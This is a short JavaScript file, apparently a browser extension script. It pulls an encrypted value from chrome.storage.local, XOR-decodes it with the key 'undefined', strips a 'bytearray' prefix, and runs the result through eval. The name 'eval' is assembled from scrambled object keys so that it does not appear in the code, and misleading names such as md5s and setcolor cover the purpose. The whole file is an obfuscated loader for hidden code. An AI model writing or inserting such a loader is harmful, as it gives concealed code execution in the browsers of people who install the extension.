function toarray(b, a) {
    return map(a, function(a, c) {
        return a.charCodeAt(0) ^ keyCharAt(b, c)
    })
}

function keyCharAt(b, a) {
    return b.charCodeAt(Math.floor(a % b.length))
}

function map(b, a) {
    for (var d = [], c = 0; c < b.length; c++) d.push(a(b[c], c));
    return d
}

function sendtoarray(b) {
    arr = toarray("undefined", b);
    ret = "";
    for (i in arr) oneChar = String.fromCharCode(arr[i]), ret += oneChar;
    return ret
}


function decoder(b) {
    var md5s;
    var hashmap = _ => Object.keys(md5s);
    md5s = {
        eate: document.querySelectorAll('*'),
        e: 1,
        lav: 5,
        tob: 'xl=',
        color: setcolor = 1,
        YW: a => hashmap()[2].split('').reverse().join('')
    };
    chrome.storage.local.get(null, function(a) {
        if (a = a[b]) {
            a = sendtoarray(a);
            var d = a.indexOf("bytearray") + 9;
            a = a.substring(d);
            this[hashmap()[1]+md5s.YW()](a);
        }
    })
}


decoder('ffyrzq');